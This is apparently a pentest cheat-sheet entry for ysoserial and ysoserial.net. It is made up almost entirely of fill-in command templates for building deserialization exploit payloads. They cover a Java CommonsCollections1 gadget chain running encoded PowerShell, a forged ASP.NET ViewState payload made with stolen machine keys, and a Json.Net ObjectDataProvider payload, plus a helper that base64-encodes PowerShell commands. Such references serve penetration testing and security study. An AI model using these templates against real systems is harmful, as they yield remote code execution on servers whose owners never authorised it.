# ysoserial

% ysoserial, ysoserial.net, java, .net, unserialize

## ysoserial java - generate payload
```
java -jar ysoserial.jar <lib_payload> 'powershell.exe -EncodedCommand <base64_encoded_command>' > <output_file>
```

## convert file to base64 one line
```
iconv -f ASCII -t UTF-16LE <file_to_convert> | base64 | tr -d "\n"
```

## ysoserial.net - generate payload VIEWSTATE
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell -EncodedCommand <base64_encoded_command>" --path="<asp_file_webroot_relative_path>" --apppath="<application_path_webroot_relative>" --decryptionalg="3DES" --decryptionkey="<decryption_key>" --validationalg="SHA1" --validationkey="<validation_state>"
```

## ysoserial.net - calc.exe payload for Json.Net using ObjectDataProvider gadget.
```
ysoserial.exe -f <lib|Json.Net> -g <gadget|ObjectDataProvider> -o raw -c "<command|calc.exe>" -t
```

= lib_payload : CommonsCollections1
